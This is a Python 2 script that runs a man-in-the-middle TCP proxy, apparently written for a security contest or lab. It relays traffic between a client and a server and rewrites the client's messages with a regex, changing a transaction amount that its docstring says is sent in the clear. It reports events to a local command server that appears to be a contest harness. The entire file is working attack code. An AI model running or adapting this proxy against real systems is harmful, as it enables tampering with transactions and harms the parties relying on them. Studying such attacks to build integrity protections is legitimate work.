#!/usr/bin/env python2
from __future__ import print_function
import traceback
import random
import socket
import argparse
import threading
import signal
import json
import requests
import sys
import base64
import time
import re
from Queue import Queue
from contextlib import contextmanager

running = True
verbose = True

CLIENT2SERVER = 1
SERVER2CLIENT = 2

pkts = []

counter = 0
def log( m):
  print( m, file=sys.stderr)

def mitm(buff, direction, shared):
  """
  Attempt a packet modification attack where the amount is changed based on the fact the amount is sent in the clear.
  """
  shared.put({"type": "done"})
  hb = "".join("{:02x}".format(ord(c)) for c in buff)
  pkts.append(buff)
  if direction == CLIENT2SERVER:
    buff = re.sub('p6\nL\d', 'p6\nL2', buff)
  elif direction == SERVER2CLIENT:
    pass
  return buff

@contextmanager
def ignored(*exceptions):
  try:
    yield
  except exceptions:
    pass 

def killp(a, b):
  with ignored(Exception):
    a.shutdown(socket.SHUT_RDWR)
    a.close()
    b.shutdown(socket.SHUT_RDWR)
    b.close()
  return

def worker(client, server, n, shared):
  while running == True:
    b = ""
    with ignored(Exception):
      b = client.recv(4096)
    if len(b) == 0:
      killp(client,server)
      return
    try:
      b = mitm(b,n, shared)
    except:
      pass
    try:
      server.send(b)
    except:
      killp(client,server)
      return
  killp(client,server)
  return

def signalhandler(sn, sf):
  global running
  running = False

def doProxyMain(port, remotehost, remoteport):
  signal.signal(signal.SIGTERM, signalhandler)
  try:
    shared = Queue()
    p = threading.Thread(target=sendInput, args=(args.c, args.d,shared))
    p.start()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", port))
    s.listen(1)
    workers = []
    print("started")
    sys.stdout.flush()
    while running == True:
      k,a = s.accept()
      v = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      v.connect((remotehost, remoteport))
      t1 = threading.Thread(target=worker, args=(k,v,CLIENT2SERVER, shared))
      t2 = threading.Thread(target=worker, args=(v,k,SERVER2CLIENT, shared))
      t2.start()
      t1.start()
      workers.append((t1,t2,k,v))
  except Exception:
    signalhandler(None, None)
  # log("********exiting1*******")
  for t1,t2,k,v in workers:
    killp(k,v)
    t1.join()
    t2.join()
  # log("********exiting2*******")
  p.join()
  # log("********exiting3*******")
  return

def sendInput( host, port, shared):
  global running
  while running:
    #log("********GETTING******* %s" % str(running))
    try:
      d = shared.get( block=True, timeout = 1)
      time.sleep(1)
      #log("got: %s" % str(d))
      r = requests.post( "http://"+host+":"+str(port), data = {'REQUEST':json.dumps(d)})
      #log( r.text)
    except:
      time.sleep(1)
      #log("********next*******")
      pass

if __name__ == '__main__':
  parser = argparse.ArgumentParser(description='Proxy')
  parser.add_argument('-p', type=int, default=4000, help="listen port")
  parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
  parser.add_argument('-q', type=int, default=3000, help="server port")
  parser.add_argument('-c', type=str, default="127.0.0.1", help="command server")
  parser.add_argument('-d', type=int, default=5000, help="command port")
  args = parser.parse_args()
  doProxyMain(args.p, args.s, args.q)

